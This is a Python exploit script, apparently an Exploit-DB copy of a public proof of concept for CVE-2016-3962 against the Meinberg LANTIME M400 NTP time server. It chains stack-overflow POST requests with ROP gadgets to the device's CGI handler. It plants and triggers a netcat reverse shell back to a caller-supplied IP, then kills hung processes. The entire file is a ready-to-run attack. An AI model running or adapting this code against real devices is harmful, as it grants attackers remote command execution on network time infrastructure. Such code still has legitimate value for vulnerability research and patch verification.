#!/usr/bin/python

# EDB Note: Source ~ https://github.com/securifera/CVE-2016-3962-Exploit
# EDB Note: More info ~ https://www.securifera.com/blog/2016/07/17/time-to-patch-rce-on-meinberg-ntp-time-server/
#
# 271 - trigger notifications
# 299 - copy user defined notifications

# Kernel Version: 2.6.15.1
# System Version: 530 
# Lantime configuration utility 1.27
# ELX800/GPS M4x V5.30p
#useage:meinberg_ntp_RCE.py targetip reverseip

import socket
import struct
import telnetlib
import sys
import time
 
if len(sys.argv) < 3:
    print "[-] <Host> <Callback IP> "
    exit(1)
 
     
host = sys.argv[1]
callback_ip = sys.argv[2]
 
print "[+] exploiting Meinburg M400"
port = 80
 
###################################################################
#
# Copy user_defined_notification to /www/filetmp
# Append reverse shell string to /file/tmp  
#
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )
 
param = "A" * 0x2850
 
resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"
 
system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8
 
#must have a listener setup to receive the callback connection on ip 192.168.60.232
# i.e. nc -v -l -p 4444
command = 'cp /mnt/flash/config/user_defined_notification /www/filetmp; echo "{rm,/tmp/foo};{mkfifo,/tmp/foo};/bin/bash</tmp/foo|{nc,' + callback_ip +'0,4444}>/tmp/foo;" >> /www/filetmp'
 
msg = "button=" + "A"*10028
msg += struct.pack("I", system )
msg += struct.pack("I", exit )
msg += struct.pack("I", some_str )
msg += command + "\x00"
 
resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close()
 
time.sleep(1)
 
###################################################################
#
# Copy /www/filetmp to user_defined_notification    
# 
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )
 
param = "A" * 0x2850
 
resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"
 
send_cmd = 0x807ED88
system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8
ret = 0x804CE65
 
#stack pivot
stack_pivot = 0x8049488
msg = "button=" + "A" * 9756
 
msg += "B" * 28
msg += struct.pack("I", 0x7FFEE01A )       # ebp
msg += struct.pack("I", 0x0804ce64 )       # pop eax ; ret
msg += struct.pack("I", some_str - 0x100 ) # some place
msg += struct.pack("I", 0x080855cc )       # add dword ptr [eax + 0x60], ebp ; ret
msg += struct.pack("I", 0x080651d4 )       # inc dword ptr [ebx + 0x566808ec] ; ret
msg += struct.pack("I", ret ) * (71/4)
 
msg += struct.pack("I", send_cmd )
msg += struct.pack("I", exit )
msg += struct.pack("I", 0x80012111 )       # [eax + 0x60]
msg += struct.pack("I", some_str )         # buffer
msg += struct.pack("I", 0xffffffff )       # count
msg += "E" * 120
 
msg += struct.pack("I", 0xB1E8B434 )   # ebx
msg += struct.pack("I", some_str - 100 )   # esi
msg += struct.pack("I", some_str - 100 )   # edi
msg += struct.pack("I", some_str - 0x100 ) # ebp
msg += struct.pack("I", stack_pivot )      # mov esp, ebp ; ret
msg += "A" * 100
 
resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close
 
time.sleep(1)
 
###################################################################
#
# Trigger reverse shell 
# 
     
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )
 
param = "A" * 0x2850
 
resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"
 
send_cmd = 0x807ED88
system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8
ret = 0x804CE65
 
#stack pivot
stack_pivot = 0x8049488
msg = "button=" + "A" * 9756
 
msg += "B" * 28
msg += struct.pack("I", 0x7FFEE01A )       # ebp
msg += struct.pack("I", 0x0804ce64 )       # pop eax ; ret
msg += struct.pack("I", some_str - 0x100 ) # some place
msg += struct.pack("I", 0x080855cc )       # add dword ptr [eax + 0x60], ebp ; ret
msg += struct.pack("I", 0x080651d4 )       # inc dword ptr [ebx + 0x566808ec] ; ret
msg += struct.pack("I", ret ) * (71/4)
 
msg += struct.pack("I", send_cmd )
msg += struct.pack("I", exit )
msg += struct.pack("I", 0x800120f5 )       # [eax + 0x60]
msg += struct.pack("I", some_str )         # buffer
msg += struct.pack("I", 0xffffffff )       # count
msg += "E" * 120
 
msg += struct.pack("I", 0xB1E8B434 )   # ebx
msg += struct.pack("I", some_str - 100 )   # esi
msg += struct.pack("I", some_str - 100 )   # edi
msg += struct.pack("I", some_str - 0x100 ) # ebp
msg += struct.pack("I", stack_pivot )      # mov esp, ebp ; ret
msg += "A" * 100
 
resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close()
 
time.sleep(1)
 
 
print "[+] cleaning up"
###################################################################
#
# Kill all mains that are hung-up
#
csock = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
csock.connect ( (host, int(port)) )
 
param = "A" * 0x2850
 
resp = "POST /cgi-bin/main HTTP/1.1\r\n"
resp += "Host: " + host + "\r\n"
resp += "User-Agent: Mozilla/5.0\r\n"
resp += "Accept: text/html\r\n"
resp += "Accept-Language: en-US\r\n"
resp += "Connection: keep-alive\r\n"
resp += "Content-Type: application/x-www-form-urlencoded\r\n"
 
system = 0x80490B0
exit = 0x80492C0
some_str = 0x850BDB8
 
command = 'killall main'
 
msg = "button=" + "A"*10028
msg += struct.pack("I", system )
msg += struct.pack("I", exit )
msg += struct.pack("I", some_str )
msg += command + "\x00"
 
resp += "Content-Length: " + str(len(msg)) + "\r\n\r\n"
resp += msg
csock.send(resp)
csock.close()
 
print "[+] enjoy"
